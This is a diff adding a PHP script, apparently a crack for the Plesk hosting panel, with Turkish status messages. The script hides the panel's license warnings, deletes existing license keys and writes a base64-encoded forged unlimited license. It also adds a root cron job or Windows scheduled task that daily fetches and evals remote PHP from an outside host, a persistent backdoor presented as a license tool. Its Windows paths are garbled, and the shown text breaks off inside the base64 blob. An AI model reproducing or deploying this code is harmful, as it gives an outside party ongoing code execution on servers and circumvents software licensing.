@@ -1,0 +1,189 @@
+<?php if(is_file('/usr/local/psa/bin/license')){
+		$AllIPs	= explode(" ",trim(shell_exec('hostname -I 2>&1')));
+	if(!in_array('95.70.165.205',$AllIPs)){
+		echo "IP Adresleri: ".implode(', ',$AllIPs)."
+";
+		echo "Lisans 95.70.165.205 icin uretilmis, farkli ip adreslerinde kullanilamaz!
+";
+		echo "
+License Provider - OsSav Technology Ltd. - www.ossav.com
+
+";
+		exit;
+	}
+}
+date_default_timezone_set('Europe/Istanbul');
+if(is_file('/usr/local/psa/bin/license')){
+	$System	= 'Linux';
+	$Lic_Dir	= '/etc/sw/keys/keys/';
+	$File_Lic	= '/usr/local/psa/bin/license';
+	$Xml_Path	= '/usr/local/psa/bin/license.xml';
+	$File_Head	= '/usr/local/psa/admin/application/default/layouts/_header.phtml';
+	$Main_CSS	= '/usr/local/psa/admin/cp/public/theme/css/main.css';
+	$AdminBin	= '/usr/local/psa/admin/bin/';
+	$Exec_End	= ' 2>&1';
+}elseif(is_file('C:\Program Files (x86)\Parallels\Pleskin\license.exe')){
+	$System	= 'Windows';
+	$Lic_Dir	= 'C:\Program Files (x86)\Parallels\Pleskdmin
+epository\keys\';
+	$File_Lic	= 'C:\Program Files (x86)\Parallels\Pleskin\license.exe';
+	$Xml_Path	= 'C:\Program Files (x86)\Parallels\Pleskin\license.xml';
+	$File_Head	= 'C:\Program Files (x86)\Parallels\Pleskdminpplication\default\layouts\_header.phtml';
+	$Main_CSS	= 'C:\Program Files (x86)\Parallels\Pleskdmin\cp\public	heme\css\main.css';
+	$AdminBin	= 'C:\Program Files (x86)\Parallels\Pleskdminin\';
+	$Exec_End	= '';
+}elseif(is_file('C:\Program Files (x86)\Pleskin\license.exe')){
+	$System	= 'Windows';
+	$Lic_Dir	= 'C:\Program Files (x86)\Pleskdmin
+epository\keys\';
+	$File_Lic	= 'C:\Program Files (x86)\Pleskin\license.exe';
+	$Xml_Path	= 'C:\Program Files (x86)\Pleskin\license.xml';
+	$File_Head	= 'C:\Program Files (x86)\Pleskdminpplication\default\layouts\_header.phtml';
+	$Main_CSS	= 'C:\Program Files (x86)\Pleskdmin\cp\public	heme\css\main.css';
+	$AdminBin	= 'C:\Program Files (x86)\Pleskdminin\';
+	$Exec_End	= '';
+}else{
+	echo "Sunucuda Plesk Panel Bulunamadi!
+";
+	exit;
+}
+echo "Sistem Tespiti: ".$System."
+";
+if(is_file($File_Lic)){
+	if(is_file($File_Head)){
+		$Kaynak	= file_get_contents($File_Head);
+		if(!strstr($Kaynak,'OsSav Lisans v1.71')){
+			if(strstr($Kaynak,'OsSav Lisans') and is_file($File_Head.".orjinal")){
+				copy($File_Head.".orjinal",$File_Head);
+			}else{
+				copy($File_Head,$File_Head.".orjinal");
+			}
+			$Kaynak	= preg_replace('`<div.*?id="license-status".*?>.*?<\/div>`i','<!--OsSav Lisans v1.71-->',$Kaynak);
+			$Kaynak	= preg_replace('`<\?=.*this->licenseStatus\(.*\?>`i','<!--OsSav Lisans v1.71-->',$Kaynak);
+			$Kaynak	= file_put_contents($File_Head,$Kaynak);
+			echo "Panel Duzenleme: Guncellendi
+";
+		}else{
+			echo "Panel Duzenleme: Zaten Guncel
+";
+		}
+	}
+	if(is_file($Main_CSS)){
+		$Kaynak	= file_get_contents($Main_CSS);
+		if(!strstr($Kaynak,'.license-status{display:none;p')){
+			$Kaynak	= str_replace('.license-status{p','.license-status{display:none;p',$Kaynak);
+			$Kaynak	= file_put_contents($Main_CSS,$Kaynak);
+			echo "Panel Duzenleme: Guncellendi
+";
+		}else{
+			echo "Panel Duzenleme: Zaten Guncel
+";
+		}
+	}
+	if($System == 'Linux'){
+		if(is_file('/var/spool/cron/root')){
+			$Cron	= file_get_contents('/var/spool/cron/root');
+			if(!strstr($Cron,'OsSav Lisans v1.71')){
+				shell_exec('sed -i "/ossav.com\/PTC/d" /var/spool/cron/root;'.$Exec_End);
+				shell_exec('sed -i "/plesktrial/d" /var/spool/cron/root;'.$Exec_End);
+				shell_exec('sed -i "/OsSav Lisans/d" /var/spool/cron/root;'.$Exec_End);
+				shell_exec('rm -rf /var/spool/cron/roote;');
+				file_put_contents('/var/spool/cron/root',rand(2,59)."	".rand(0,2)."	*	*	*	".$AdminBin."php -er \"eval(file_get_contents('http://ossav.com/PTC'));\" #OsSav Lisans v1.71
+",FILE_APPEND);
+				echo "Cron Gorev Ekleme: Guncellendi
+";
+			}else{
+				echo "Cron Gorev Ekleme: Zaten Guncel
+";
+			}
+		}else{
+			echo "Cron Gorev Ekleme: var/spool/cron/root Yok!
+";
+		}
+	}elseif($System == 'Windows'){
+		$CronBul=trim(shell_exec('schtasks /Query | findstr "OsSav Lisans"'.$Exec_End));
+		if(!stristr($CronBul,'OsSav Lisans v1.71')){
+			if(stristr($CronBul,'OsSav Lisans')){
+				preg_match_all('`OsSav Lisans\s\w[.\d]+`i',$CronBul,$Liste, PREG_PATTERN_ORDER);
+				foreach($Liste[0] as $Tmp => $CNM){
+					shell_exec('schtasks /Delete /tn "'.trim($CNM).'" /F'.$Exec_End);
+				}
+			}
+			shell_exec('schtasks /create /tn "OsSav Lisans v1.71" /tr "\"%plesk_bin%\php.exe\" -er \"eval(file_get_contents(\\"http://ossav.com/PTC\\"));\"" /sc DAILY /mo 1'.$Exec_End);
+			echo "Cron Gorev Ekleme: Guncellendi
+";
+		}else{
+			echo "Cron Gorev Ekleme: Zaten Guncel
+";
+		}
+	}
+	$LicDeneSay=1;
+	foreach(scandir($Lic_Dir) as $File){
+		if(!in_array($File,['.','..'])){
+			$Filx=file_get_contents($Lic_Dir.$File);
+			if(stristr($Filx,'>plesk-unified<') and !stristr($Filx,'plesk-unified:domains core:type="integer">unlimited</plesk-unified:domains')){
+				echo "Gecersiz Eski Lisans Silindi: ".$Lic_Dir.$File."
+";
+				unlink($Lic_Dir.$File);
+			}elseif(stristr($Filx,'<core:expiration-date core:type="date">')){
+				$ZamanAl	= explode('<core:expiration-date core:type="date">',$Filx,2);
+				$ZamanAl	= explode('</',$ZamanAl[1],2);
+				$ZamanAl	= strtotime(trim($ZamanAl[0]));
+				if($ZamanAl > strtotime("+1 days")){
+					echo date("d-m-Y",$ZamanAl)." Tarihli Limitsiz Lisans Mevcut: ".$Lic_Dir.$File."
+";
+				}else{
+					echo date("d-m-Y",$ZamanAl)." Tarihli Eski Lisans Silindi: ".$Lic_Dir.$File."
+";
+					unlink($Lic_Dir.$File);
+				}
+			}else{
+				echo "Eski Lisans Zaman Bilgisi Yok, Silindi: ".$Lic_Dir.$File."
+";
+				unlink($Lic_Dir.$File);
+			}
+		}
+	}
+	echo "Mevcut Lisansiniz Kontrol Ediliyor...
+";
+		$LicKontrol=trim(shell_exec('plesk bin license --retrieve'.$Exec_End));
+	if(stristr($LicKontrol,': Done')){
+		echo "Mevcut Lisansiniz Yenilendi.
+";
+		shell_exec('plesk db "DELETE FROM psa.sessions";');
+		shell_exec('plesk bin poweruser --off');
+	}elseif(!stristr($LicKontrol,': Done')){
+		echo "Mevcut Lisans Bulunamadi.
+";
+		echo "Yeni Lisans Kodu: A00A00-K7GK09-KHYP59-H1FJ69-JZNP26
+";
+		file_put_contents($Xml_Path,base64_decode("PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48cGxlc2stdW5pZmllZDprZXkgeG1sbnM6cGxlc2stdW5pZmllZD0iaHR0cDovL3BhcmFsbGVscy5jb20vc2NoZW1hcy9rZXlzL3Byb2R1Y3RzL3BsZXNrL3VuaWZpZWQvbXVsdGkiIGNvcmU6Zm9ybWF0PSJvcGVuZnVzaW9uLTMiIHhtbG5zOmNvcmU9Imh0dHA6Ly9wYXJhbGxlbHMuY29tL3NjaGVtYXMva2V5cy9jb3JlLzMiPgogICA8IS0tVW5pcXVlIHByb2R1Y3QgS2V5IG51bWJlci0tPgogICA8Y29yZTprZXktbnVtYmVyIGNvcmU6dHlwZT0ic3RyaW5nIj5QTFNLLjA5NTk2OTI2PC9jb3JlOmtleS1udW1iZXI+CiAgIDwhLS1LZXkgdmVyc2lvbi0tPgogICA8Y29yZTprZXktdmVyc2lvbiBjb3JlOnR5cGU9InN0cmluZyI+MDAwMTwvY29yZTprZXktdmVyc2lvbj4KICAgPCEtLUtleSBkZXNjcmlwdGlvbi0tPgogICA8Y29yZTpkZXNjcmlwdGlvbj4KICAgICAgPGNvcmU6a2V5dHlwZT5QbGVzayBXZWIgSG9zdCBFZGl0aW9uICgxNCBEYXlzIFRyaWFsKTwvY29yZTprZXl0eXBlPgogICAgICA8Y29yZTpwcm9wZXJ0eSBjb3JlOnZhbHVlPSI5OSI+QWRkaXRpb25hbCBMYW5ndWFnZSBQYWNrczwvY29yZTpwcm9wZXJ0eT4KICAgPC9jb3JlOmRlc2NyaXB0aW9uPgogICA8IS0tUHJvZHVjdCB3aGljaCB0aGlzIGxpY2Vuc2UgaXMgaW50ZW5kZWQgdG8gd29yayBvbi0tPgogICA8Y29yZTpwcm9kdWN0IGNvcmU6dHlwZT0ic3RyaW5nIj5wbGVzay11bmlmaWVkPC9jb3JlOnByb2R1Y3Q+CiAgIDwhLS1TdXBwb3J0ZWQgcHJvZHVjdCB2ZXJzaW9uLS0+CiAgIDxjb3JlOnZlcnNpb24gY29yZTp0eXBlPSJzdHJpbmciPjEyLjA8L2NvcmU6dmVyc2lvbj4KICAgPCEtLVN1cHBvcnRlZCBwcm9kdWN0IHZlcnNpb24tLT4KICAgPGNvcmU6dmVyc2lvbiBjb3JlOnR5cGU9InN0cmluZyI+MTguMDwvY29yZTp2ZXJzaW9uPgogICA8IS0tU3VwcG9ydGVkIHByb2R1Y3QgdmVyc2lvbi0tPgogICA8Y29yZTp2ZXJzaW9uIGNvcmU6dHlwZT0ic3RyaW5nIj4xNy4wPC9jb3JlOnZlcnNpb24+CiAgIDwhLS1EYXRlIGFmdGVyIHdoaWNoIHRoaXMgbGljZW5zZSBiZWNvbWVzIHVzYWJsZSAoaW5jbHVzaXZlKS0tPgogICA8Y29yZTpzdGFydC1kYXRlIGNvcmU6dHlwZT0iZGF0ZSI+aW5zdGFudDwvY29yZTpzdGFydC1kYXRlPgogICA8IS0tRGF0ZSBiZWZvcmUgd2hpY2ggdGhpcyBsaWNlbnNlIGlzIHVzYWJsZSAoZXhjbHVzaXZlKS0tPgogICA8Y29yZTpleHBpcmF0aW9uLWRhdGUgY29yZTp0eXBlPSJkYXRlIj4yMDIyLTA3LTE2PC9jb3JlOmV4cGlyYXRpb24tZGF0ZT4KICAgPCEtLVVSTCBvZiB0aGUgc2VydmljZSBlbmRwb2ludCB0byB1c2Ugd2hlbiBwZXJmb3JtaW5nIGFuIGF1dG91cGRhdGUtLT4KICAgPGNvcmU6bGljZW5zZS1zZXJ2ZXItdXJsIGNvcmU6dHlwZT0ic3RyaW5nIj5odHRwczovL2thLnBsZXNrLmNvbS94bWxycGM8L2NvcmU6bGljZW5zZS1zZXJ2ZXItdXJsPgogICA8IS0tRGF0ZSB3aGVuIHByb2R1Y3Qgd2lsbCB0cnkgdG8gcGVyZm9ybSBhbiBhdXRvdXBkYXRlLS0+CiAgIDxjb3JlOnVwZGF0ZS1kYXRlIGNvcmU6dHlwZT0iZGF0ZSI+bmV2ZXI8L2NvcmU6dXBkYXRlLWRhdGU+CiAgIDxjb3JlOnVwZGF0ZS10aWNrZXQgY29yZTpoaWRkZW49InRydWUiIGNvcmU6dHlwZT0ic3RyaW5nIj50N2NxM2pkNmhqcnU5cmV4ZHctcTN6dTUyamkwcDJ5MTwvY29yZTp1cGRhdGUtdGlja2V0PgogICA8IS0tTnVtYmVyIG9mIGRvbWFpbnMtLT4KICAgPHBsZXNrLXVuaWZpZWQ6ZG9tYWlucyBjb3JlOnR5cGU9ImludGVnZXIiPnVubGltaXRlZDwvcGxlc2stdW5pZmllZDpkb21haW5zPgogICA8IS0tTnVtYmVyIG9mIGNsaWVudHMtLT4KICAgPHBsZXNrLXVuaWZpZWQ6Y2xpZW50cyBjb3JlOnR5cGU9ImludGVnZXIiPnVubGltaXRlZDwvcGxlc2stdW5pZmllZDpjbGllbnRzPgogICA8IS0tTnVtYmVyIG9mIHdlYnVzZXJzLS0+CiAgIDxwbGVzay11bmlmaWVkOndlYnVzZXJzIGNvcmU6dHlwZT0iaW50ZWdlciI+dW5saW1pdGVkPC9wbGVzay11bmlmaWVkOndlYnVzZXJzPgogICA8IS0tTnVtYmVyIG9mIG1haWxuYW1lcy0tPgogICA8cGxlc2stdW5pZmllZDptYWlsbmFtZXMgY29yZTp0eXBlPSJpbnRlZ2VyIj51bmxpbWl0ZWQ8L3BsZXNrLXVuaWZpZWQ6bWFpbG5hbWVzPgogICA8IS0tTnVtYmVyIG9mIGFkZGl0aW9uYWwgbGFuZ3VhZ2UgcGFjayhzKS0tPgogICA8cGxlc2stdW5pZmllZDpsYW5ndWFnZS1wYWNrcyBjb3JlOnR5cGU9ImludGVnZXIiPjk5PC9wbGVzay11bmlmaWVkOmxhbmd1YWdlLXBhY2tzPgogICA8cGxlc2stdW5pZmllZDptcGMtaWQgY29yZTpoaWRkZW49InRydWUiIGNvcmU6dHlwZT0iaW50ZWdlciI+MDwvcGxlc2stdW5pZmllZDptcGMtaWQ+CiAgIDxwbGVzay11bmlmaWVkOm1wYy1kaXNhYmxlZCBjb3JlOmhpZGRlbj0idHJ1ZSIgY29yZTp0eXBlPSJib29sZWFuIj5mYWxzZTwvcGxlc2stdW5pZmllZDptcGMtZGlzYWJsZWQ+CiAgIDwhLS1Hb29nbGUgdG9vbHMtLT4KICAgPHBsZXNrLXVuaWZpZWQ6Z29vZ2xlLXRvb2xzIGNvcmU6dHlwZT0iYm9vbGVhbiI+ZmFsc2U8L3BsZXNrLXVuaWZpZWQ6Z29vZ2xlLXRvb2xzPgogICA8IS0tTnVtYmVyIG9mIHNsYXZlcy0tPgogICA8cGxlc2stdW5pZmllZDpzbGF2ZXMgY29yZTp0eXBlPSJpbnRlZ2VyIj41MDwvcGxlc2stdW5pZmllZDpzbGF2ZXM+CiAgIDwhLS1FdmVudE1hbmFnZXItLT4KICAgPHBsZXNrLXVuaWZpZWQ6ZXZlbnQtbWFuYWdlciBjb3JlOnR5cGU9ImJvb2xlYW4iPnRydWU8L3BsZXNrLXVuaWZpZWQ6ZXZlbnQtbWFuYWdlcj4KICAgPCEtLURvbWFpbnMgYmFja3VwLS0+CiAgIDxwbGVzay11bmlmaWVkOmRvbWFpbnMtYmFja3VwIGNvcmU6dHlwZT0iYm9vbGVhbiI+dHJ1ZTwvcGxlc2stdW5pZmllZDpkb21haW5zLWJhY2t1cD4KICAgPCEtLVRvbWNhdCBzdXBwb3J0LS0+CiAgIDxwbGVzay11bmlmaWVkOnRvbWNhdC1zdXBwb3J0IGNvcmU6dHlwZT0iYm9vbGVhbiI+dHJ1ZTwvcGxlc2stdW5pZmllZDp0b21jYXQtc3VwcG9ydD4KICAgPCEtLVN1YmRvbWFpbnMtLT4KICAgPHBsZXNrLXVuaWZpZWQ6c3ViZG9tYWlucy1zdXBwb3J0IGNvcmU6dHlwZT0iYm9vbGVhbiI+dHJ1ZTwvcGxlc2stdW5pZmllZDpzdWJkb21haW5zLXN1cHBvcnQ+CiAgIDwhLS1CYWNrd2FyZCBrZXkgY29tcGF0aWJpbGl0eSByZXN0cmljdGlvbi0tPgogICA8cGxlc2stdW5pZmllZDpiYWNrd2FyZC1yZXN0cmljdGlvbiBjb3JlOnR5cGU9ImludGVnZXIiPjA8L3BsZXNrLXVuaWZpZWQ6YmFja3dhcmQtcmVzdHJpY3Rpb24+CiAgIDwhLS1Xb3JrIEluc2lkZSBWaXJ0dW96em8tLT4KICAgPHBsZXNrLXVuaWZpZWQ6dnBzLW9ubHkgY29yZTp0eXBlPSJib29sZWFuIj5mYWxzZTwvcGxlc2stdW5pZmllZDp2cHMtb25seT4KICAgPCEtLVdvcmsgSW5zaWRlIEh5cGVyLVYtLT4KICAgPHBsZXNrLXVuaWZpZWQ6aHlwZXItdiBjb3JlOnR5cGU9ImJvb2xlYW4iPmZhbHNlPC9wbGVzay11bmlmaWVkOmh5cGVyLXY+CiAgIDwhLS1Xb3JrIEluc2lkZSBWTXdhcmUtLT4KICAgPHBsZXNrLXVuaWZpZWQ6dm13YXJlIGNvcmU6dHlwZT0iYm9vbGVhbiI+ZmFsc2U8L3BsZXNrLXVuaWZpZWQ6dm13YXJlPgogICA8IS0tV29yayBJbnNpZGUgWGVuLS0+CiAgIDxwbGVzay11bmlmaWVkOnhlbiBjb3JlOnR5cGU9ImJvb2xlYW4iPmZhbHNlPC9wbGVzay11bmlmaWVkOnhlbj4KICAgPCEtLVdvcmsgSW5zaWRlIEtWTS0tPgogICA8cGxlc2stdW5pZmllZDprdm0gY29yZTp0eXBlPSJib29sZWFuIj5mYWxzZTwvcGxlc2stdW5pZmllZDprdm0+CiAgIDwhLS1Xb3JrIEluc2lkZSBQYXJhbGxlbHMgSHlwZXJ2aXNvci0tPgogICA8cGxlc2stdW5pZmllZDpoeXBlcnZpc29yIGNvcmU6dHlwZT0iYm9vbGVhbiI+ZmFsc2U8L3BsZXNrLXVuaWZpZWQ6aHlwZXJ2aXNvcj4KICAgPCEtLVdvcmsgSW5zaWRlIExYQy0tPgogICA8cGxlc2stdW5pZmllZDpseGMgY29yZTp0eXBlPSJib29sZWFuIj5mYWxzZTwvcGxlc2stdW5pZmllZDpseGM+CiAgIDwhLS1Xb3JrIEluc2lkZSBQYXJhbGxlbHMgU2VydmVyLS0+CiAgIDxwbGVzay11bmlmaWVkOnBhcmFsbGVscy1zZXJ2ZXIgY29yZTp0eXBlPSJib29sZWFuIj5mYWxzZTwvcGxlc2stdW5pZmllZDpwYXJhbGxlbHMtc2VydmVyPgogICA8IS0tR2xvYmFsIGNoYW5nZXMtLT4KICAgPHBsZXNrLXVuaWZpZWQ6Z2xvYmFsLWNoYW5nZXMgY29yZTp0eXBlPSJib29sZWFuIj50cnVlPC9wbGVzay11bmlmaWVkOmdsb2JhbC1jaGFuZ2VzPgogICA8IS0tU2hlbGwgYWNjZXNzLS0+CiAgIDxwbGVzay11bmlmaWVkOnNoZWxsLWFjY2VzcyBjb3JlOnR5cGU9ImJvb2xlYW4iPnRydWU8L3BsZXNrLXVuaWZpZWQ6c2hlbGwtYWNjZXNzPgogICA8IS0tRGV0YWlsZWQgdHJhZmZpYy0tPgogICA8cGxlc2stdW5pZmllZDpkZXRhaWxlZC10cmFmZmljIGNvcmU6dHlwZT0iYm9vbGVhbiI+dHJ1ZTwvcGxlc2stdW5pZmllZDpkZXRhaWxlZC10cmFmZmljPgogICA8IS0tTm90aWZpY2F0aW9uIG1hbmFnZXItLT4KICAgPHBsZXNrLXVuaWZpZWQ6bm90aWZpY2F0aW9uLW1hbmFnZXIgY29yZTp0eXBlPSJib29sZWFuIj50cnVlPC9wbGVzay11bmlmaWVkOm5vdGlmaWNhdGlvbi1tYW5hZ2VyPgogICA8IS0tQWN0aW9uIGxvZyBtYW5hZ2VyLS0+CiAgIDxwbGVzay11bmlmaWVkOmFjdGlvbi1tYW5hZ2VyIGNvcmU6dHlwZT0iYm9vbGVhbiI+dHJ1ZTwvcGxlc2stdW5pZmllZDphY3Rpb24tbWFuYWdlcj4KICAgPCEtLUNsaWVudHMgYW5kIERvbWFpbnMgRXhwaXJhdGlvbnMgbWFuYWdlbWVudC0tPgogICA8cGxlc2stdW5pZmllZDpleHBpcmF0aW9ucy1tYW5hZ2VyIGNvcmU6dHlwZT0iYm9vbGVhbiI+dHJ1ZTwvcGxlc2stdW5pZmllZDpleHBpcmF0aW9ucy1tYW5hZ2VyPgogICA8IS0tQ2xpZW50IHRlbXBsYXRlcy0tPgogICA8cGxlc2stdW5pZmllZDpjbGllbnQtdGVtcGxhdGVzIGNvcmU6dHlwZT0iYm9vbGVhbiI+dHJ1ZTwvcGxlc2stdW5pZmllZDpjbGllbnQtdGVtcGxhdGVzPgogICA8IS0tQWJpbGl0eSB0byB1c2UgUG9zdGdyZVNRTC0tPgogICA8cGxlc2stdW5pZmllZDpwb3N0Z3Jlc3FsLXN1cHBvcnQgY29yZTp0eXBlPSJib29sZWFuIj50cnVlPC9wbGVzay11bmlmaWVkOnBvc3RncmVzcWwtc3VwcG9ydD4KICAgPCEtLUFiaWxpdHkgdG8gdXNlIENvbGRGdXNpb24tLT4KICAgPHBsZXNrLXVuaWZpZWQ6Y29sZGZ1c2lvbi1zdXBwb3J0IGNvcmU6dHlwZT0iYm9vbGVhbiI+dHJ1ZTwvcGxlc2stdW5pZmllZDpjb2xkZnVzaW9uLXN1cHBvcnQ+CiAgIDxwbGVzay11bmlmaWVkOmFzay11cGRhdGUgY29yZTpoaWRkZW49InRydWUiIGNvcmU6dHlwZT0iYm9vbGVhbiI+ZmFsc2U8L3BsZXNrLXVuaWZpZWQ6YXNrLXVwZGF0ZT4KICAgPHBsZXNrLXVuaWZpZWQ6YXV0b2luc3RhbGxlci1jb25maWcgY29yZTpoaWRkZW49InRydWUiIGNvcmU6dHlwZT0ic3RyaW5nIj50cnVlPC9wbGVzay11bmlmaWVkOmF1dG9pbnN0YWxsZXItY29uZmlnPgogICA8IS0tQWJpbGl0eSB0byB1c2UgRHJXZWItLT4KICAgPHBsZXNrLXVuaWZpZWQ6ZHJ3ZWItc3VwcG9ydCBjb3JlOnR5cGU9ImJvb2xlYW4iPnRydWU8L3BsZXNrLXVuaWZpZWQ6ZHJ3ZWItc3VwcG9ydD4KICAgPHBsZXNrLXVuaWZpZWQ6c3RvcmUtaWQgY29yZTpoaWRkZW49InRydWUiIGNvcmU6dHlwZT0iaW50ZWdlciI+MTwvcGxlc2stdW5pZmllZDpzdG9yZS1pZD4KICAgPCEtLUFiaWxpdHkgdG8gdXNlIE1pZ3JhdGlvbiBNYW5hZ2VyLS0+CiAgIDxwbGVzay11bmlmaWVkOm1pZ3JhdGlvbi1tYW5hZ2VyIGNvcmU6dHlwZT0iYm9vbGVhbiI+dHJ1ZTwvcGxlc2stdW5pZmllZDptaWdyYXRpb24tbWFuYWdlcj4KICAgPCEtLUFiaWxpdHkgdG8gdXNlIE1TIFNRTC0tPgogICA8cGxlc2stdW5pZmllZDptc3NxbCBjb3JlOnR5cGU9ImJvb2xlYW4iPnRydWU8L3BsZXNrLXVuaWZpZWQ6bXNzcWw+CiAgIDwhLS1BbGxvd2VkIGxvY2FsZXMtLT4KICAgPHBsZXNrLXVuaWZpZWQ6YWxsb3dlZC1sb2NhbGVzIGNvcmU6dHlwZT0ic3RyaW5nIj5hbnk8L3BsZXNrLXVuaWZpZWQ6YWxsb3dlZC1sb2NhbGVzPgogICA8IS0tUGFyYWxsZWxzIFBsZXNrIEJpbGxpbmcgYWNjb3VudHMgY291bnQtLT4KICAgPHBsZXNrLXVuaWZpZWQ6bW9kZXJuYmlsbC1hY2NvdW50cyBjb3JlOnR5cGU9ImludGVnZXIiPjEwMDA8L3BsZXNrLXVuaWZpZWQ6bW9kZXJuYmlsbC1hY2NvdW50cz4KICAgPCEtLU51bWJlciBvZiBzaXRlcy0tPgogICA8cGxlc2stdW5pZmllZDpzaXRlYnVpbGRlci1zaXRlcyBjb3JlOnR5cGU9ImludGVnZXIiPjEwMDwvcGxlc2stdW5pZmllZDpzaXRlYnVpbGRlci1zaXRlcz4KICAgPCEtLUVuYWJsZSBQYXJhbGxlbHMgUGxlc2sgU3Vic2NyaXB0aW9ucyBNYW5hZ2VtZW50LS0+CiAgIDxwbGVzay11bmlmaWVkOmNhbi1tYW5hZ2Utc3Vic2NyaXB0aW9ucyBjb3JlOnR5cGU9ImJvb2xlYW4iPnRydWU8L3BsZXNrLXVuaWZpZWQ6Y2FuLW1hbmFnZS1zdWJzY3JpcHRpb25zPgogICA8IS0tRW5hYmxlIFBhcmFsbGVscyBQbGVzayBTZXJ2aWNlIFByb3ZpZGVyIE1vZGUtLT4KICAgPHBsZXNrLXVuaWZpZWQ6Y2FuLW1hbmFnZS1hY2NvdW50cyBjb3JlOnR5cGU9ImJvb2xlYW4iPnRydWU8L3BsZXNrLXVuaWZpZWQ6Y2FuLW1hbmFnZS1hY2NvdW50cz4KICAgPCEtLUVuYWJsZSBQYXJhbGxlbHMgUGxlc2sgQ3VzdG9tZXIgTWFuYWdlbWVudC0tPgogICA8cGxlc2stdW5pZmllZDpjYW4tbWFuYWdlLWN1c3RvbWVycyBjb3JlOnR5cGU9ImJvb2xlYW4iPnRydWU8L3BsZXNrLXVuaWZpZWQ6Y2FuLW1hbmFnZS1jdXN0b21lcnM+CiAgIDwhLS1FbmFibGUgUGFyYWxsZWxzIFBsZXNrIFJlc2VsbGVycyBNYW5hZ2VtZW50LS0+CiAgIDxwbGVzay11bmlmaWVkOmNhbi1tYW5hZ2UtcmVzZWxsZXJzIGNvcmU6dHlwZT0iYm9vbGVhbiI+dHJ1ZTwvcGxlc2stdW5pZmllZDpjYW4tbWFuYWdlLXJlc2VsbGVycz4KICAgPCEtLUVuYWJsZSBDdXN0b20gVmlldyBNYW5hZ2VtZW50LS0+CiAgIDxwbGVzay11bmlmaWVkOmNhbi1tYW5hZ2UtY3VzdG9tLXZpZXcgY29yZTp0eXBlPSJib29sZWFuIj50cnVlPC9wbGVzay11bmlmaWVkOmNhbi1tYW5hZ2UtY3VzdG9tLXZpZXc+CiAgIDwhLS1FbmFibGUgUGFyYWxsZWxzIFBsZXNrIFVsdGltYXRlIFdvcmRwcmVzcyBmZWF0dXJlLS0+CiAgIDxwbGVzay11bmlmaWVkOndvcmRwcmVzcy10b29sa2l0IGNvcmU6dHlwZT0iYm9vbGVhbiI+dHJ1ZTwvcGxlc2stdW5pZmllZDp3b3JkcHJlc3MtdG9vbGtpdD4KICAgPCEtLUVuYWJsZSBQYXJhbGxlbHMgUGxlc2sgT3V0Z29pbmcgQW50aS1zcGFtIGZlYXR1cmUtLT4KICAgPHBsZXNrLXVuaWZpZWQ6b3V0Z29pbmctYW50aXNwYW0gY29yZTp0eXBlPSJib29sZWFuIj50cnVlPC9wbGVzay11bmlmaWVkOm91dGdvaW5nLWFudGlzcGFtPgogICA8IS0tRW5hYmxlIFBhcmFsbGVscyBQbGVzayBTZWN1cml0eSBDb3JlIGZlYXR1cmUtLT4KICAgPHBsZXNrLXVuaWZpZWQ6c2VjdXJpdHktY29yZSBjb3JlOnR5cGU9ImJvb2xlYW4iPnRydWU8L3BsZXNrLXVuaWZpZWQ6c2VjdXJpdHktY29yZT4KICAgPCEtLUVuYWJsZSBDb250cm9sIFN1aXRlIGZvciBXaW5kb3dzIGJ5IFBlcmlnb24gZmVhdHVyZS0tPgogICA8cGxlc2stdW5pZmllZDpjb250cm9sLXN1aXRlIGNvcmU6dHlwZT0iYm9vbGVhbiI+ZmFsc2U8L3BsZXNrLXVuaWZpZWQ6Y29udHJvbC1zdWl0ZT4KICAgPCEtLUVuYWJsZSBTZXJ2ZXJTaGllbGQgYnkgQ2xvdWRGbGFyZSBmZWF0dXJlLS0+CiAgIDxwbGVzay11bmlmaWVkOnNlcnZlci1zaGllbGQtY2xvdWRmbGFyZSBjb3JlOnR5cGU9ImJvb2xlYW4iPnRydWU8L3BsZXNrLXVuaWZpZWQ6c2VydmVyLXNoaWVsZC1jbG91ZGZsYXJlPgogICA8IS0tRW5hYmxlIFNlcnZlclNoaWVsZCBQbHVzIGJ5IENsb3VkRmxhcmUgZmVhdHVyZS0tPgogICA8cGxlc2stdW5pZmllZDpzZXJ2ZXItc2hpZWxkLXBsdXMtY2xvdWRmbGFyZSBjb3JlOnR5cGU9ImJvb2xlYW4iPmZhbHNlPC9wbGVzay11bmlmaWVkOnNlcnZlci1zaGllbGQtcGx1cy1jbG91ZGZsYXJlPgogICA8IS0tV2ViIFByZXNlbmNlIEJ1aWxkZXIgZm9yIFBsZXNrIC0gTXVsdGktbGFuZ3VhZ2UgU2l0ZXMgU3VwcG9ydCBmZWF0dXJlLS0+CiAgIDxwbGVzay11bmlmaWVkOndwYi1tdWx0aS1sYW5ndWFnZS1zaXRlcy1zdXBwb3J0IGNvcmU6dHlwZT0iYm9vbGVhbiI+ZmFsc2U8L3BsZXNrLXVuaWZpZWQ6d3BiLW11bHRpLWxhbmd1YWdlLXNpdGVzLXN1cHBvcnQ+CiAgIDwhLS1SZW1vdGUgU21hcnRlck1haWwgU3VwcG9ydC0tPgogICA8cGxlc2stdW5pZmllZDpyZW1vdGUtc21hcnRlcm1haWwtZW5hYmxlZCBjb3JlOnR5cGU9ImJvb2xlYW4iPnRydWU8L3BsZXNrLXVuaWZpZWQ6cmVtb3RlLXNtYXJ0ZXJtYWlsLWVuYWJsZWQ+CiAgIDwhLS1MaW1pdCBTeXN0ZW0gUmVzb3VyY2VzIHBlciBTdWJzY3JpcHRpb24tLT4KICAgPHBsZXNrLXVuaWZpZWQ6c3lzdGVtLXJlc291cmNlcy1saW1pdHMtZW5hYmxlZCBjb3JlOnR5cGU9ImJvb2xlYW4iPnRydWU8L3BsZXNrLXVuaWZpZWQ6c3lzdGVtLXJlc291cmNlcy1saW1pdHMtZW5hYmxlZD4KICAgPCEtLVBsZXNrIEJyYW5kaW5nLS0+CiAgIDxwbGVzay11bmlmaWVkOmVkaXRpb24gY29yZTp0eXBlPSJzdHJpbmciPndlYi1ob3N0PC9wbGVzay11bmlmaWVkOmVkaXRpb24+CiAgIDwhLS1QbGVzayBCcmFuZGluZy0tPgogICA8cGxlc2stdW5pZmllZDplZGl0aW9uLW5hbWUgY29yZTp0eXBlPSJzdHJpbmciPndlYiBob3N0IGVkaXRpb248L3BsZXNrLXVuaWZpZWQ6ZWRpdGlvbi1uYW1lPgogICA8IS0tTGljZW5zZSB0eXBlLS0+CiAgIDxwbGVzay11bmlmaWVkOmxpY2Vuc2U